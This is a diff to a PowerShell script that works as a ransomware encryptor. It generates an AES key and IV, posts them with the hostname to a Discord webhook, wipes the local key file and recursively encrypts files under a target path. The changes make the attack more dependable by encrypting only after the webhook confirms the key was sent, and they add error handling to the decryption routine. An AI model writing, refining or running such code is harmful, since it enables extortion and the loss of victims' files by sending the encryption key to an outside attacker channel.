@@ -14,12 +14,19 @@ function E-D {
     )
 
     function SendToDiscord($webhook, $message, $hostname) {
-        $body = @{
-            content = "**Hostname:** $hostname `n**Key:** $message"
-        } | ConvertTo-Json
+		$body = @{
+			content = "**Hostname:** $hostname `n**Key:** $message"
+		} | ConvertTo-Json
+		
+		try {
+			Invoke-RestMethod -Uri $webhook -Method POST -Body $body -ContentType 'application/json'
+			return $true
+		} catch {
+			Write-Host "Failed to send message to Discord: $_"
+			return $false
+		}
+	}
 
-        Invoke-RestMethod -Uri $webhook -Method POST -Body $body -ContentType 'application/json'
-    }
 
     $hostname = [System.Environment]::MachineName
 
@@ -56,28 +63,52 @@ function E-D {
 		$passwordText = [Convert]::ToBase64String($key) + "|" + [Convert]::ToBase64String($iv)
 		Set-Content -Path "$p\key.txt" -Value $passwordText
 
-		SendToDiscord $wh $passwordText $hostname
+		$webhookSuccess = SendToDiscord $wh $passwordText $hostname
 
-		Clear-Content "$p\key.txt"
+		if ($webhookSuccess) {
+			Clear-Content "$p\key.txt"
 
-		Get-ChildItem -Path $p -Recurse -File | Where-Object { $_.Name -ne "key.txt" } | ForEach-Object {
-			EncryptFile $_.FullName ($_.FullName + ".enc") $aes
+			Get-ChildItem -Path $p -Recurse -File | Where-Object { $_.Name -ne "key.txt" } | ForEach-Object {
+				EncryptFile $_.FullName ($_.FullName + ".enc") $aes
+			}
+		} else {
+			Write-Host "Invalid Webhook. Aborting encryption."
+			# Optionally, remove the key file if the webhook is invalid.
+			Remove-Item "$p\key.txt" 
 		}
 	}
+
 
 
     if ($d) {
         $keyPath = "$p\key.txt"
         if (Test-Path $keyPath) {
             $passwordText = Get-Content $keyPath
+
+            # Check if the key and IV are not empty
+            if ($passwordText -eq $null -or $passwordText.Split("|").Count -ne 2) {
+                Write-Host "Invalid or empty key and/or IV. Aborting decryption."
+                return
+            }
+
             $key = [Convert]::FromBase64String($passwordText.Split("|")[0])
             $iv = [Convert]::FromBase64String($passwordText.Split("|")[1])
+
+            # Check for correct key and IV length
+            if ($key.Length -ne 32 -or $iv.Length -ne 16) {
+                Write-Host "Invalid key or IV length. Aborting decryption."
+                return
+            }
 
             $aes.Key = $key
             $aes.IV = $iv
 
-            Get-ChildItem -Path $p -Recurse -File | Where-Object { $_.Extension -eq ".enc" } | ForEach-Object {
-                DecryptFile $_.FullName ($_.FullName -replace ".enc$", "") $aes
+            try {
+                Get-ChildItem -Path $p -Recurse -File | Where-Object { $_.Extension -eq ".enc" } | ForEach-Object {
+                    DecryptFile $_.FullName ($_.FullName -replace ".enc$", "") $aes
+                }
+            } catch {
+                Write-Host "An error occurred during decryption: $_. Aborting decryption."
             }
         } else {
             Write-Host "The key file is not located in the directory. Aborting decryption."
